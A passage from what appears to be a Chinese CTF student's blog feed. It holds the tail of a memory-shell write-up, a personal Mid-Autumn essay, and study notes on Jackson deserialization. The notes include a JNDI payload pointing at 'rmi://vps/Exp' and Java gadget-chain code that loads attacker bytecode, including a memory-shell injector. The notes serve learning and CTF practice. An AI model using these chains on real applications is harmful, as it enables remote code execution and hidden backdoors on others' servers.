class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>b1<span class="hljs-symbol">$</span>ab<span class="hljs-symbol">$</span><span class="hljs-number">88</span><span class="hljs-symbol">$</span><span class="hljs-number">86</span><span class="hljs-symbol">$</span>c0BK<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>bbnb<span class="hljs-symbol">$</span>f9<span class="hljs-symbol">$</span>ce<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span>C<span class="hljs-symbol">$</span><span class="hljs-number">81</span>E<span class="hljs-symbol">$</span>G<span class="hljs-symbol">$</span><span class="hljs-number">5</span>bA<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A</code></pre></div><p>用这个去替换掉driver里的内容</p><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20230917113039223.png" alt="image-20230917113039223"></p><p><img src="/2023/10/06/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%8F%8A%E6%8B%9B%E6%96%B0%E8%B5%9B/image-20230917113101312.png" alt="image-20230917113101312"></p><p>成功回显</p><p>呜呜，有点激动，第一次复现出内存马的题（虽然对内存马还一无所知），要加快学习进度了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>又是一年中秋</title>
    <link href="/2023/09/29/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%B8%AD%E7%A7%8B/"/>
    <url>/2023/09/29/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%B8%AD%E7%A7%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="年年岁岁、岁岁年年"><a href="#年年岁岁、岁岁年年" class="headerlink" title="年年岁岁、岁岁年年"></a>年年岁岁、岁岁年年</h1><p>又是一年中秋，月亮仍是人们手机里的常客，月亮很亮，但即使抬头望去，却仍眼中无月，心中无人</p><p>去年中秋，借着计院的工作室宣传，我加入我们工作室的宣传群，不同于他人加各个工作室宣传群争取更多的机会，我只加了一个，我想要的不多，只一件感兴趣的事即可，甚至在打完招新赛、面试结束后想着要是过不了的话，那就打算考研，也不打算搞其他工作室（即使是有充足的时间去准备）</p><p>或许是自己那佛性的性格，亦或许是不愿麻烦</p><p>但幸运的是我成功了</p><p>不过这之后感觉只是挂了个头衔，自己不会社交，不懂与师兄交涉（而且活跃打ctf的web师兄就一个，感觉更不好意思了），不会去认识同届的同学</p><p>唯一的一次就是寒假的比赛，鼓起勇气去找unknown师傅组队（第一次比赛，虽然是三校的小比赛），然后认识到了unknown师傅和lolita师傅的强大</p><p>再然后线下见到师傅们是在大一下开学后参观工作室，见到了优秀的师兄们，也第一次见unknown、lolita等师傅</p><p>之后我虽然一直想着学习，但无人带、不会学习、不懂学习让我一直在原地踏步</p><p>直到五月初的MINIL CTF真正意义上的投入比赛（虽然只做出了一道），然后认真学习</p><p>然后就是不断打比赛，参加国赛、打省赛，打各种CTF，但从没有打出过成绩</p><p>然后就一直到现在。</p><p>知道Boogipop大佬是在一次做题时，题目中有博客链接，文章作者的友链就是Boogipop大佬</p><p>看pop同学文章几眼后觉得好厉害，于是便保存了下来，但也没怎么看过了</p><p>直到五月中旬的好像是吉林大学的ctf比赛中，看到Boogipop大佬一骑绝尘，在赛后看wp时才发觉原来这是同一个人</p><p>之后Boogipop大佬在各种CTF比赛中大杀四方（一点都不夸张），于是就跟着大佬文章学习</p><p>看了他开始的文章后觉得很好，于是便开始了跟随Boogipop大佬学习的故事（搭博客是在一两个月后了）</p><p>如今又是一年中秋，在插曲后的热情逐渐消散，学习效率逐渐降低，这使我再次焦虑起来</p><p>回想起当时面试工作室时说的“我努力学习不是为了什么，只是不想成为过去那一事无成的自己”</p><p>不知道写什么了</p><p>最后立目标吧，肯定要打进过一次线下赛公费旅游，然后继续跟着Boogipop大佬文章学习，多跟unknown师傅和lolita师傅学习实战、内网等知识</p><p>近一点的目标，就这个中秋加国庆假期吧，希望自己能多学一些java反序列化的进阶链子，然后帮unknown和lolita师傅搭建招新赛的平台（啥都不会，感觉一直在帮倒忙。。。）</p><p>只管努力，拨开云雾，静待花开</p><p>只盼下次抬头时，眼中有光，那光名为希望</p><p><img src="/2023/09/29/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%B8%AD%E7%A7%8B/image-20230930012654577.png" alt="image-20230930012654577"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Jackson</title>
    <link href="/2023/09/27/Jackson/"/>
    <url>/2023/09/27/Jackson/</url>
    
    <content type="html"><![CDATA[<h1 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h1><p>前言：</p><p>自从在一次比赛之后看了Boogipop大佬的wp后，了解到了Jackson，现在心心念念的Jackson终于要开始啦</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>ObjectMapper.writeValueAsString()    序列化    </p><p>ObjectMapper.readValue()       反序列化</p><h2 id="多态问题"><a href="#多态问题" class="headerlink" title="多态问题"></a>多态问题</h2><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><ul><li>JAVA_LANG_OBJECT</li><li>OBJECT_AND_NON_CONCRETE</li><li>NON_CONCRETE_AND_ARRAYS</li><li>NON_FINAL</li></ul><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>类里的属性被声明为一个Object类型时，会对该Object类型的属性进行序列化和反序列化，并且明确规定类名</p><div class="code-wrapper"><pre><code class="hljs haxe">User user = <span class="hljs-keyword">new</span> <span class="hljs-type">User</span>(<span class="hljs-string">&quot;Sentiment&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-type">User2</span>());ObjectMapper mapper = <span class="hljs-keyword">new</span> <span class="hljs-type">ObjectMapper</span>();<span class="hljs-comment">//JAVA_LANG_OBJECT</span>mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</code></pre></div><h4 id="OBJECT-AND-NON-CONCRETE"><a href="#OBJECT-AND-NON-CONCRETE" class="headerlink" title="OBJECT_AND_NON_CONCRETE"></a>OBJECT_AND_NON_CONCRETE</h4><p>默认选项。除了前面提到的特征，当类里有Interface、AbstractClass类时，对其进行序列化和反序列化。</p><h4 id="NON-CONCRETE-AND-ARRAYS"><a href="#NON-CONCRETE-AND-ARRAYS" class="headerlink" title="NON_CONCRETE_AND_ARRAYS"></a>NON_CONCRETE_AND_ARRAYS</h4><p>除了前面提到的特征外，还支持Array类型。</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="JsonTypeInfo注解"></a>JsonTypeInfo注解</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)<span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)<span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)<span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)<span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CUSTOM)</code></pre></div><h4 id="JsonTypeInfo-Id-CLASS-class"><a href="#JsonTypeInfo-Id-CLASS-class" class="headerlink" title="JsonTypeInfo.Id.CLASS      @class"></a>JsonTypeInfo.Id.CLASS      @class</h4><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> username;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> password;    <span class="hljs-meta">@JsonTypeInfo</span>(use = <span class="hljs-title class_">JsonTypeInfo</span>.<span class="hljs-property">Id</span>.<span class="hljs-property">CLASS</span>)    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> <span class="hljs-built_in">object</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql">&#123;&quot;username&quot;:&quot;Sentiment&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;object&quot;:&#123;&quot;@class&quot;:&quot;Jackson.User2&quot;,&quot;name&quot;:&quot;Tana&quot;&#125;&#125;//结果<span class="hljs-keyword">User</span>&#123;username=<span class="hljs-string">&#x27;Sentiment&#x27;</span>, <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;123456&#x27;</span>, <span class="hljs-keyword">object</span>=User2&#123;<span class="hljs-type">name</span>=<span class="hljs-string">&#x27;Tana&#x27;</span>, <span class="hljs-keyword">object</span>=<span class="hljs-keyword">null</span>&#125;&#125;</code></pre></div><p>@class方式能指定相关类，并进行相关调用。</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS-c"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS-c" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS         @c"></a>JsonTypeInfo.Id.MINIMAL_CLASS         @c</h4><div class="code-wrapper"><pre><code class="hljs pgsql">&#123;&quot;username&quot;:&quot;Sentiment&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;object&quot;:&#123;&quot;@c&quot;:&quot;jackson.User2&quot;,&quot;name&quot;:&quot;Tana&quot;&#125;&#125;//结果<span class="hljs-keyword">User</span>&#123;username=<span class="hljs-string">&#x27;Sentiment&#x27;</span>, <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;123456&#x27;</span>, <span class="hljs-keyword">object</span>=User2&#123;<span class="hljs-type">name</span>=<span class="hljs-string">&#x27;Tana&#x27;</span>, <span class="hljs-keyword">object</span>=<span class="hljs-keyword">null</span>&#125;&#125;</code></pre></div><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>类似于fastjson，加上了@type字段，指明了类名，但是并没有指明包名，因此反序列化时抛出异常，所以此种方式<strong>不能进行反序列化</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;Sentiment&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;User2&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Tana&quot;</span>&#125;&#125;Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.JsonMappingException</span>: Could not resolve.......</code></pre></div><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>直接抛出异常，需要用户自定义来使用</p><h2 id="调用过程"><a href="#调用过程" class="headerlink" title="调用过程"></a>调用过程</h2><p>反序列化会调用构造函数和setter</p><p>序列化会调用getter</p><p>与fastjson差不多</p><h1 id="Jackson反序列化"><a href="#Jackson反序列化" class="headerlink" title="Jackson反序列化"></a>Jackson反序列化</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h2 id="使用DefaultTyping-记得是数组"><a href="#使用DefaultTyping-记得是数组" class="headerlink" title="使用DefaultTyping()    记得是数组"></a>使用DefaultTyping()    记得是数组</h2><div class="code-wrapper"><pre><code class="hljs abnf">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT)<span class="hljs-comment">; </span></code></pre></div><p>如果没有开<code>JAVA_LANG_OBJECT</code>，Test类在做反序列化的时候，只是做了赋值，并没有进行实例化，除了设置<code>NON_FINAL</code>以外都可以</p><p>序列化的结果是有数组的，修改包名和类名就行</p><div class="code-wrapper"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;zero&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:[<span class="hljs-string">&quot;jackson.User2&quot;</span>,&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;tana&quot;</span>&#125;]&#125;</code></pre></div><p>payload:      （【】中第一个是指定的类，{}中是赋值）</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://vps/Exp&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> name;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sex;    <span class="hljs-keyword">public</span> Object myObject;</code></pre></div><div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-type">ObjectMapper</span> mapper <span class="hljs-operator">=</span> new <span class="hljs-type">ObjectMapper</span>();mapper.enableDefaultTyping(<span class="hljs-type">ObjectMapper</span>.<span class="hljs-type">DefaultTyping</span>.<span class="hljs-type">JAVA_LANG_OBJECT</span>); <span class="hljs-type">Student</span> s2 <span class="hljs-operator">=</span> mapper.readValue(<span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>name<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>5wimming<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>sex<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>boy<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>myObject<span class="hljs-subst">\&quot;</span>:[<span class="hljs-subst">\&quot;</span>jacksonn.Test<span class="hljs-subst">\&quot;</span>,&#123;<span class="hljs-subst">\&quot;</span>testt<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>test<span class="hljs-subst">\&quot;</span>&#125;]&#125;&quot;</span>, <span class="hljs-type">Student</span>.class);<span class="hljs-comment">//myobject被object修饰</span></code></pre></div><h1 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h1><blockquote><p>Reference </p><p><a href="https://xz.aliyun.com/t/12966#toc-6">深入浅出解析Jackson反序列化 - 先知社区 (aliyun.com)</a></p><p><a href="https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">Jackson反序列化通杀Web题(过时) - Boogiepop Doesn’t Laugh (boogipop.com)</a></p></blockquote><h2 id="POJONode-（实际调用的是-BaseJsonNode）"><a href="#POJONode-（实际调用的是-BaseJsonNode）" class="headerlink" title="POJONode （实际调用的是 BaseJsonNode）"></a>POJONode （实际调用的是 BaseJsonNode）</h2><p>POJONode中不存在有<code>toString</code>方法的实现，在其父类<code>BaseJsonNode</code>中存在有，因其为一个抽象类，所以选择使用<code>POJONode</code>这个没有实现<code>toString</code>方法的类进行利用</p><p><code>toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString</code>方法</p><p>最关键的就是最后一个方法的调用了，将一个Bean对象序列化一个json串的使用常用的方法是<code>writeValueAsString</code>方法，在调用该方法的过程中将会通过遍历的方法将bean对象中的所有的属性的getter方法进行调用</p><h2 id="Other-Gadgets-绕过技巧"><a href="#Other-Gadgets-绕过技巧" class="headerlink" title="Other Gadgets  绕过技巧"></a>Other Gadgets  绕过技巧</h2><p>按照理论来说只需要寻找到继承<code>BaseJsonNode</code>的类，并且没有重写<code>toSting</code>方法，就能够替代<code>POJONode</code>类</p><h2 id="通杀-（不知道为什么叫通杀，就是调用toString而已）"><a href="#通杀-（不知道为什么叫通杀，就是调用toString而已）" class="headerlink" title="通杀 （不知道为什么叫通杀，就是调用toString而已）"></a>通杀 （不知道为什么叫通杀，就是调用toString而已）</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.sql.SQLOutput;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>));        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<span class="hljs-comment">//        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);</span><span class="hljs-comment">//        val.setAccessible(true);</span><span class="hljs-comment">//        val.set(exp,jsonNodes);</span>        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);        deserial((serial(exp)));           &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(o);        oos.close();        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());        <span class="hljs-keyword">return</span> base64String;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;&#125;</code></pre></div><p>和fastjson差不多，用的是POJONode</p><h2 id="jackson最关键的是这里-！！！！"><a href="#jackson最关键的是这里-！！！！" class="headerlink" title="jackson最关键的是这里  ！！！！"></a>jackson最关键的是这里  ！！！！</h2><p><code>POJONode</code>是继承<code>ValueNode</code>的 <code>ValueNode</code>是继承<code>BaseJsonNode</code>的</p><p>而在<code>BaseJsonNode</code>中存在</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function">Object <span class="hljs-title">writeReplace</span>()</span> &#123;<span class="hljs-keyword">return</span> NodeSerialization.<span class="hljs-keyword">from</span>(<span class="hljs-keyword">this</span>);&#125;</code></pre></div><p>意味着 我们在反序列化的时候 会经过这个writeReplace方法 这个方法会对我们的序列化过程进行检查 从而阻止我们的序列化进程，我们需要将其重写出来 将这个方法去掉</p><p><img src="/../images/Jackson/image-20231116184725409.png" alt="image-20231116184725409"></p><p>按照图示本地生成，复制粘贴BaseJsonNode的内容，然后在本地的文件中删除下面这一部分</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function">Object <span class="hljs-title">writeReplace</span>()</span> &#123;<span class="hljs-keyword">return</span> NodeSerialization.<span class="hljs-keyword">from</span>(<span class="hljs-keyword">this</span>);&#125;</code></pre></div><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p><img src="/../images/Jackson/image-20231116190917633.png" alt="image-20231116190917633"></p><p>这是本地的<code>BaseJsonNode</code></p><p><img src="/../images/Jackson/image-20231116191013118.png" alt="image-20231116191013118"></p><p><img src="/../images/Jackson/image-20231116190828568.png" alt="image-20231116190828568"></p><p>之后一直调试，一直到<code>serializeAsField</code></p><p><img src="/../images/Jackson/image-20231116191438854.png" alt="image-20231116191438854"></p><h2 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.net.URI;<span class="hljs-keyword">import</span> java.nio.file.Files;<span class="hljs-keyword">import</span> java.nio.file.Paths;<span class="hljs-keyword">import</span> java.security.*;<span class="hljs-keyword">import</span> java.sql.SQLOutput;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;));</span>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;</span>));        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templatesimpl);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);        setValue(exp,<span class="hljs-string">&quot;val&quot;</span>,jsonNodes);        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(exp,privateKey,signingEngine);        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);        setValue(exp1,<span class="hljs-string">&quot;val&quot;</span>,jsonNode);        System.out.println((serial(exp1)));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span 